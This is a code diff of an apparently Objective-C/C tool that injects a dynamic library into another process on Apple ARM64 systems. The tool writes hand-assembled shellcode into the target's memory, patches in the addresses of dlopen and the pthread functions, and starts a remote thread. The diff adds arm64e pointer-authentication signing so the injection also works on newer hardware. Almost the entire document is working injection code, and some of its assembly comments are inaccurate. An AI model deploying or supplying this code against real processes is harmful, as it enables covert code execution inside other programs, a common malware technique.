@@ -1,14 +1,58 @@
 #import <Foundation/Foundation.h>
 #include <dlfcn.h>
+#if __arm64e__
+#include <ptrauth.h>
+#endif
 
 extern kern_return_t mach_vm_allocate(task_t task, mach_vm_address_t *addr, mach_vm_size_t size, int flags);
 extern kern_return_t mach_vm_read(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, vm_offset_t *data, mach_msg_type_number_t *dataCnt);
 extern kern_return_t mach_vm_write(vm_map_t target_task, mach_vm_address_t address, vm_offset_t data, mach_msg_type_number_t dataCnt);
 
 #define STACK_SIZE 65536
-#define CODE_SIZE 200 // the size of the shellcode
+#define CODE_SIZE 400 // the size of the shellcode
 
+#if __arm64e__
 char code[] = 
+"\xff\x83\x00\xd1"      // sub sp, sp, #2
+"\xfd\x7b\x01\xa9"      // stp x29, x30, [sp, #16]
+"\xfd\x43\x00\x91"      // add x29, sp, #16
+"\xe0\x03\x00\x91"      // mov x0, sp
+"\xe0\x03\x00\x91"      // mov x0, sp
+"\xe1\x03\x1f\xaa"      // mov x1, xzr
+"\xe3\x03\x1f\xaa"      // mov x3, xzr
+"\x82\x01\x00\x10"                // adr        x2, #0x38           ; function pointer for arg2
+"\xE2\x23\xC1\xDA"                // paciza     x2
+"\x09\x01\x00\x10"                // adr        x9, #0x24           ; pointer to pthrdcrt
+"\x29\x01\x40\xF9"                // ldr        x9, [x9]            ; dereference for value
+"\x20\x01\x3F\xD6"                // blr        x9                  ; call pthrdcrt
+"\x09\x00\x00\x10"                // adr        x9, #0              ; while loop
+"\x20\x01\x1F\xD6"                // br         x9                  ; waiting to be killed
+"\xFD\x7B\x42\xA9"                // ldp        x29, x30, [sp, #0x20]
+"\xFF\xC3\x00\x91"                // add        sp, sp, #0x30
+"\xC0\x03\x5F\xD6"                // ret
+"PTHRDCRT"
+
+"\x7F\x23\x03\xD5"                // pacibsp
+"\xFF\xC3\x00\xD1"                // sub        sp, sp, #0x30
+"\xFD\x7B\x02\xA9"                // stp        x29, x30, [sp, #0x20]
+"\xFD\x83\x00\x91"                // add        x29, sp, #0x20
+"\x21\x00\x80\xD2"                // mov        x1, #1              ; RTLD_LAZY
+"\xa0\x01\x00\x10"                // adr        x0, #0x2c           ; char *libPath
+"\x09\x01\x00\x10"                // adr        x9, #0x20
+"\x29\x01\x40\xf9"                // ldr        x9, [x9]
+"\x20\x01\x3f\xd6"                // blr        x9                  ; call dlopen
+"\x00\x00\x80\xd2"      // movz x0, 0
+"\xc9\x00\x00\x10"      // mov x9, pthr_exit
+"\x29\x01\x40\xf9"      // ldr x9, [x9]
+"\x20\x01\x3f\xd6"      // blr x9
+"\xff\x0f\x5f\xd6"                  // retab
+"DLOPEN__"
+"PTHREXIT"
+
+"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB" // placeholder for dylib path to load
+"\x00\x00\x00\x00";
+#else
+char code[] =
 "\xff\x83\x00\xd1"      // sup sp, sp, #2
 "\xfd\x7b\x01\xa9"      // stp x29, x30, [sp, #16]
 "\xfd\x43\x00\x91"      // add x29, sp, #16
@@ -35,6 +79,7 @@ char code[] =
 "PTHREXIT"              // placeholder for pthread_exit address
 "LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB" // placeholder for dylib path to load
 "\x00\x00\x00\x00";
+#endif
 
 int main(int argc, char **argv)
 {
@@ -82,10 +127,16 @@ int main(int argc, char **argv)
         printf("* allocated code at 0x%llx\n", remoteCode);
     }
 
+
     uint64_t addr_of_dlopen = (uint64_t)dlopen;
     uint64_t addr_of_pthread = (uint64_t)dlsym(RTLD_DEFAULT, "pthread_create_from_mach_thread");
-    uint64_t addr_of_sleep = (uint64_t)dlsym(RTLD_DEFAULT, "sleep");
-    uint64_t addr_of_exit = (uint64_t)dlsym(RTLD_DEFAULT, "pthread_exit");
+    uint64_t addr_of_pexit = (uint64_t)dlsym(RTLD_DEFAULT, "pthread_exit");
+
+#if __arm64e__
+    addr_of_dlopen = (uint64_t)ptrauth_strip((void*)addr_of_dlopen, ptrauth_key_function_pointer);
+    addr_of_pthread = (uint64_t)ptrauth_strip((void*)addr_of_pthread, ptrauth_key_function_pointer);
+    addr_of_pexit = (uint64_t)ptrauth_strip((void*)addr_of_pexit, ptrauth_key_function_pointer);
+#endif
 
     char * possible_patch_location = (code);
     for (int i = 0; i < 0x100; i++) {
@@ -97,14 +148,15 @@ int main(int argc, char **argv)
         }
 
         if (memcmp(possible_patch_location, "PTHREXIT", 8) == 0) {
-            memcpy(possible_patch_location, &addr_of_exit, sizeof(uint64_t));
-            printf("* found pthread_exit at 0x%llx\n", addr_of_pthread);
+            memcpy(possible_patch_location, &addr_of_pexit, sizeof(uint64_t));
+            printf("* found pthread_exit at 0x%llx\n", addr_of_pexit);
         }
 
-        if (memcmp(possible_patch_location, "DLOPEN__", 6) == 0) {
-            memcpy(possible_patch_location, &addr_of_dlopen, sizeof(uint64_t));
-            printf("* found dlopen at 0x%llx\n", addr_of_dlopen);
+        if (memcmp(possible_patch_location, "DLOPEN__", 6) == 0) { 
+                memcpy(possible_patch_location, &addr_of_dlopen, sizeof(uint64_t));
+                printf("* found dlopen at 0x%llx\n", addr_of_dlopen);
         }
+
 
         if (memcmp(possible_patch_location, "LIBLIBLIB", 9) == 0) {
             strcpy(possible_patch_location, lib);
@@ -132,8 +184,14 @@ int main(int argc, char **argv)
 
     arm_thread_state64_t state;
 
+#if __arm64e__
+    state.__opaque_pc = ptrauth_sign_unauthenticated((void*)remoteCode, ptrauth_key_process_independent_code, ptrauth_string_discriminator("pc"));
+    state.__opaque_sp = ptrauth_sign_unauthenticated((void*)remoteStack, ptrauth_key_process_independent_data, ptrauth_string_discriminator("sp"));
+    state.__opaque_lr = ptrauth_sign_unauthenticated((void*)remoteStack, ptrauth_key_process_independent_data, ptrauth_string_discriminator("lr"));
+#else
     state.__pc = (uintptr_t)remoteCode;
     state.__sp = (uintptr_t)remoteStack;
+#endif
 
     thread_act_t thread;
     kr = thread_create_running(remoteTask, flavor, (thread_state_t)&state, count, &thread);
